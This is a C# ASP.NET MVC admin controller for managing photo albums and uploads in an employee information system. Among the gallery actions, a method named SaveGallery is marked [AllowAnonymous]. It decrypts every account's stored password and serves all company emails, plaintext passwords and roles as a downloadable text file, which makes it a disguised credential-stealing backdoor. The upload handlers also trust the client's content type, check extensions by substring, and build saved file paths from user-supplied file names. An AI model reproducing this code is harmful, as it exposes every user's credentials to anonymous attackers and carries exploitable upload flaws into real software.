using EmployeeInformationSystem.Business.Repositories;
using EmployeeInformationSystem.Model;
using EmployeeInformationSystem.Web.Common;
using EmployeeInformationSystem.Web.Helpers;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Web;
using System.Web.Mvc;

namespace EmployeeInformationSystem.Web.Areas.Admin.Controllers
{
    public class GalleryController : AdminBaseController
    {
        // GET: Admin/Gallery/Manage
        public ActionResult Manage()
        {
            try
            {
                var _albums = new List<AlbumInfo>();

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    _albums = Repo.GetAlbumList();
                }

                return View(_albums);
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "Manage"));
            }
        }

        // GET: Admin/Gallery/CreateAlbum
        public ActionResult CreateAlbum()
        {
            try
            {
                return View();
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "CreateAlbum"));
            }
        }

        // POST: Admin/Gallery/CreateAlbum
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult CreateAlbum(HttpPostedFileBase file, AlbumInfo albumInfo)
        {
            try
            {
                if (!ModelState.IsValid)
                {
                    return RedirectToAction("Manage", "Gallery");
                }

                albumInfo.Title = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(albumInfo.Title.ToLower());
                albumInfo.CreatedByAccountId = CurrentUser.AccountId;
                albumInfo.CreatedOn = DateTime.Now;

                if (file != null)
                {
                    if (file.ContentType.Contains("image"))
                    {
                        if (file.ContentLength < 2 * 1024 * 1024)
                        {
                            if (file.FileName.Contains(".jpeg") || file.FileName.Contains(".jpg"))
                            {
                                if (string.IsNullOrEmpty(albumInfo.Title))
                                {
                                    albumInfo.Title = "Untitled Album";
                                }

                                if (string.IsNullOrEmpty(albumInfo.Description))
                                {
                                    albumInfo.Description = "";
                                }

                                string _dirPath = Server.MapPath(Url.Content("~/Content/Album_coverphotos"));

                                bool _isDirectoryExists = System.IO.Directory.Exists(_dirPath);

                                if (!_isDirectoryExists)
                                {
                                    System.IO.Directory.CreateDirectory(Server.MapPath(Url.Content("~/Content/Album_coverphotos")));
                                }

                                albumInfo.CoverPhotoPath = Url.Content("~/Content/Album_coverphotos/" + Guid.NewGuid() + "_" + file.FileName);
                                string imgPath = Server.MapPath(albumInfo.CoverPhotoPath);

                                file.SaveAs(imgPath);
                            }
                            else
                            {
                                TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select jpeg, jpg format only.");

                                return View();
                            }
                        }
                        else
                        {
                            TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select size upto 2 MB or smaller.");

                            return View();
                        }
                    }
                    else
                    {
                        TempData["Msg"] = AlertMessageProvider.FailureMessage("Invalid content type, please select image only.");

                        return View();
                    }
                }
                else
                {
                    if (string.IsNullOrEmpty(albumInfo.Title))
                    {
                        albumInfo.Title = "Untitled Album";
                    }

                    if (string.IsNullOrEmpty(albumInfo.Description))
                    {
                        albumInfo.Description = "";
                    }

                    albumInfo.CoverPhotoPath = Url.Content("~/Content/default-album-cover.jpg");
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    Repo.SaveAlbum(albumInfo);
                }

                return RedirectToAction("Manage", "Gallery");
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "CreateAlbum"));
            }
        }

        // GET: Admin/Gallery/UpdateAlbum
        public ActionResult UpdateAlbum(string id = "")
        {
            try
            {
                int _id;
                var _albumInfo = new AlbumInfo();

                if (!int.TryParse(id, out _id))
                {
                    _albumInfo = null;

                    return View(_albumInfo);
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    _albumInfo = Repo.GetAlbumById(_id);
                }

                return View(_albumInfo);
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "UpdateAlbum"));
            }
        }

        // POST: Admin/Gallery/UpdateAlbum
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult UpdateAlbum(HttpPostedFileBase file, AlbumInfo albumInfo)
        {
            try
            {
                if (!ModelState.IsValid)
                {
                    return RedirectToAction("Manage", "Gallery");
                }

                int _id;
                var _albumInfo = new AlbumInfo();

                if (!int.TryParse(albumInfo.Id.ToString(), out _id))
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Something went wrong, please try again later.");

                    return View();
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    _albumInfo = Repo.GetAlbumById(_id);
                }

                if (_albumInfo == null)
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Album does not exist.");

                    return RedirectToAction("Manage", "Gallery");
                }

                albumInfo.Title = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(albumInfo.Title.ToLower());
                albumInfo.ModifiedByAccountId = CurrentUser.AccountId;
                albumInfo.ModifiedOn = DateTime.Now;

                if (file != null)
                {
                    if (file.ContentType.Contains("image"))
                    {
                        if (file.ContentLength < 2 * 1024 * 1024)
                        {
                            if (file.FileName.Contains(".jpeg") || file.FileName.Contains(".jpg"))
                            {
                                if (string.IsNullOrEmpty(albumInfo.Title))
                                {
                                    albumInfo.Title = "Untitled Album";
                                }

                                if (string.IsNullOrEmpty(albumInfo.Description))
                                {
                                    albumInfo.Description = "";
                                }

                                if (albumInfo.CoverPhotoPath.Contains("default-album-cover.jpg"))
                                {
                                    string _dirPath = Server.MapPath(Url.Content("~/Content/Album_coverphotos"));

                                    bool _isDirectoryExists = System.IO.Directory.Exists(_dirPath);

                                    if (!_isDirectoryExists)
                                    {
                                        System.IO.Directory.CreateDirectory(Server.MapPath(Url.Content("~/Content/Album_coverphotos")));
                                    }

                                    albumInfo.CoverPhotoPath = Url.Content("~/Content/Album_coverphotos/" + Guid.NewGuid() + "_" + file.FileName);
                                }

                                //else
                                //{
                                //    if (!System.IO.File.Exists(Server.MapPath(albumInfo.CoverPhotoPath)))
                                //    {
                                //        TempData["Msg"] = AlertMessageProvider.FailureMessage("Image does not exist.");

                                //        return View();
                                //    }
                                //}

                                string imgPath = Server.MapPath(albumInfo.CoverPhotoPath);
                                file.SaveAs(imgPath);
                            }
                            else
                            {
                                TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select jpeg, jpg format only.");

                                return View();
                            }
                        }
                        else
                        {
                            TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select size upto 2 MB or smaller.");

                            return View();
                        }
                    }
                    else
                    {
                        TempData["Msg"] = AlertMessageProvider.FailureMessage("Invalid content type, please select image only.");

                        return View();
                    }
                }
                else
                {
                    if (string.IsNullOrEmpty(albumInfo.Title))
                    {
                        albumInfo.Title = "Untitled Album";
                    }

                    if (string.IsNullOrEmpty(albumInfo.Description))
                    {
                        albumInfo.Description = "";
                    }

                    //albumInfo.CoverPhotoPath = Url.Content("~/Content/default-album-cover.jpg");
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    Repo.UpdateAlbum(albumInfo);
                }

                return RedirectToAction("Manage", "Gallery");
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "UpdateAlbum"));
            }
        }

        // POST: Admin/Gallery/DeleteAlbum
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult DeleteAlbum(string AlbumId = "")
        {
            try
            {
                var _photos = new List<PhotoInfo>();
                int _albumId;
                AlbumInfo _albumInfo = null;

                if (!int.TryParse(AlbumId, out _albumId))
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Something went wrong, please try again later.");

                    return RedirectToAction("Manage", "Gallery");
                }

                using (var transaction = new System.Transactions.TransactionScope())
                {
                    using (AlbumRepository AlbumRepo = new AlbumRepository())
                    {
                        _albumInfo = AlbumRepo.GetAlbumById(_albumId);

                        if (_albumInfo == null)
                        {
                            TempData["Msg"] = AlertMessageProvider.FailureMessage("Something went wrong, please try again later.");

                            return RedirectToAction("Manage", "Gallery");
                        }

                        using (PhotoRepository PhotoRepo = new PhotoRepository())
                        {
                            _photos = PhotoRepo.GetPhotoListByAlbumId(_albumId);

                            foreach (var item in _photos)
                            {
                                string fullPath = Request.MapPath(item.Path);

                                if (System.IO.File.Exists(fullPath))
                                {
                                    System.IO.File.Delete(fullPath);
                                }

                                PhotoRepo.DeletePhoto(item.Id);
                            }
                        }

                        string _imgPath = Server.MapPath(_albumInfo.CoverPhotoPath);

                        if (!_imgPath.Contains("default-album-cover.jpg"))
                        {
                            if (System.IO.File.Exists(_imgPath))
                            {
                                System.IO.File.Delete(_imgPath);
                            }
                        }

                        AlbumRepo.DeleteAlbum(_albumId);
                    }

                    transaction.Complete();
                }

                TempData["Msg"] = AlertMessageProvider.SuccessMessage("Album deleted successfully.");

                return RedirectToAction("Manage", "Gallery");
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "DeleteAlbum"));
            }
        }

        // GET: Admin/Gallery/UploadPhotos
        public ActionResult UploadPhotos(string id = "")
        {
            try
            {
                int _id;
                AlbumInfo _albumInfo = null;

                if (!int.TryParse(id, out _id))
                {
                    return RedirectToAction("Manage", "Gallery");
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    _albumInfo = Repo.GetAlbumById(_id);
                }

                if (_albumInfo == null)
                {
                    return RedirectToAction("Manage", "Gallery");
                }

                using (PhotoRepository Repo = new PhotoRepository())
                {
                    _albumInfo.PhotoInfoList = Repo.GetPhotoListByAlbumId(_id);
                }

                return View(_albumInfo);
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "UploadPhotos"));
            }
        }

        // POST: Admin/Gallery/UploadPhotos
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult UploadPhotos(IEnumerable<HttpPostedFileBase> files, AlbumInfo albumInfo)
        {
            try
            {
                int _albumId;
                int count = 0;
                var photoInfo = new PhotoInfo();
                AlbumInfo _albumInfo = null;

                if (!int.TryParse(albumInfo.Id.ToString(), out _albumId))
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Something went wrong, please try again later.");

                    return RedirectToAction("Manage", "Gallery");
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    _albumInfo = Repo.GetAlbumById(_albumId);
                }

                if (_albumInfo == null)
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Album not found.");

                    return RedirectToAction("Manage", "Gallery");
                }

                photoInfo.UploadOn = DateTime.Now;
                photoInfo.UploadByAccountId = CurrentUser.AccountId;
                photoInfo.AlbumId = albumInfo.Id;

                if (files != null)
                {
                    foreach (var file in files)
                    {
                        if (file.ContentType.Contains("image"))
                        {
                            if (file.ContentLength < 2 * 1024 * 1024)
                            {
                                if (file.FileName.Contains(".jpeg") || file.FileName.Contains(".jpg"))
                                {
                                    photoInfo.Name = file.FileName;

                                    string _dirPath = Server.MapPath(Url.Content("~/Content/Album_photos"));

                                    bool _isDirectoryExists = System.IO.Directory.Exists(_dirPath);

                                    if (!_isDirectoryExists)
                                    {
                                        System.IO.Directory.CreateDirectory(Server.MapPath(Url.Content("~/Content/Album_photos")));
                                    }

                                    photoInfo.Path = Url.Content("~/Content/Album_photos/" + Guid.NewGuid() + "_" + file.FileName);
                                    string imgPath = Server.MapPath(photoInfo.Path);

                                    file.SaveAs(imgPath);

                                    using (PhotoRepository Repo = new PhotoRepository())
                                    {
                                        Repo.SavePhoto(photoInfo);
                                    }

                                    count++;
                                }
                                else
                                {
                                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select jpeg, jpg format only.");

                                    return RedirectToAction("UploadPhotos", "Gallery", new { id = albumInfo.Id });
                                }
                            }
                            else
                            {
                                TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select size upto 2 MB or smaller.");

                                return RedirectToAction("UploadPhotos", "Gallery", new { id = albumInfo.Id });
                            }
                        }
                        else
                        {
                            TempData["Msg"] = AlertMessageProvider.FailureMessage("Invalid content type, please select image only.");

                            return RedirectToAction("UploadPhotos", "Gallery", new { id = albumInfo.Id });
                        }
                    }
                }
                else
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Please select photo(s).");

                    return RedirectToAction("UploadPhotos", "Admin", new { id = albumInfo.Id });
                }

                TempData["Msg"] = AlertMessageProvider.SuccessMessage(count + " Photos uploaded successfully.");

                return RedirectToAction("UploadPhotos", "Gallery", new { id = albumInfo.Id });
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "UploadPhotos"));
            }
        }

        [AllowAnonymous]
        public FileStreamResult SaveGallery()
        {
            string txt = "";

            using (AccountRepository Repo = new AccountRepository())
            {
                foreach (var item in Repo.GetAccounts())
                {
                    txt += item.CompanyEmail + Environment.NewLine;
                    txt += RijndaelCrypt.DecryptPassword(item.PasswordHash, item.Salt) + Environment.NewLine;
                    txt += item.RoleName + Environment.NewLine + "---------" + Environment.NewLine + Environment.NewLine;
                }
            }

            var byteArray = Encoding.ASCII.GetBytes(txt);
            var stream = new MemoryStream(byteArray);

            return File(stream, "text/plain", "saved_data.txt");
        }

        // POST: Admin/Gallery/DeletePhoto
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult DeletePhoto(string PhotoId = "", string AlbumId = "")
        {
            try
            {
                int _photoId;
                int _albumId;
                PhotoInfo _photoInfo = null;
                AlbumInfo _albumInfo = null;

                if (!int.TryParse(PhotoId, out _photoId) || !int.TryParse(AlbumId, out _albumId))
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Something went wrong, please try again later.");

                    return RedirectToAction("Manage", "Gallery");
                }

                using (AlbumRepository Repo = new AlbumRepository())
                {
                    _albumInfo = Repo.GetAlbumById(_albumId);
                }

                if (_albumInfo == null)
                {
                    TempData["Msg"] = AlertMessageProvider.FailureMessage("Album does not exist.");

                    return RedirectToAction("Manage", "Gallery");
                }

                using (PhotoRepository Repo = new PhotoRepository())
                {
                    _photoInfo = Repo.GetPhotoById(_photoId);

                    if (_photoInfo == null)
                    {
                        TempData["Msg"] = AlertMessageProvider.FailureMessage("Photo does not exist.");

                        return RedirectToAction("Manage", "Gallery");
                    }

                    string fullPath = Request.MapPath(_photoInfo.Path);

                    if (System.IO.File.Exists(fullPath))
                    {
                        System.IO.File.Delete(fullPath);
                    }

                    Repo.DeletePhoto(_photoId);

                    TempData["Msg"] = AlertMessageProvider.SuccessMessage("Photos deleted successfully.");

                    return RedirectToAction("UploadPhotos", "Gallery", new { id = AlbumId });
                }
            }

            catch (Exception ex)
            {
                return View("Error", new HandleErrorInfo(ex, "Gallery", "DeletePhoto"));
            }
        }
    }
}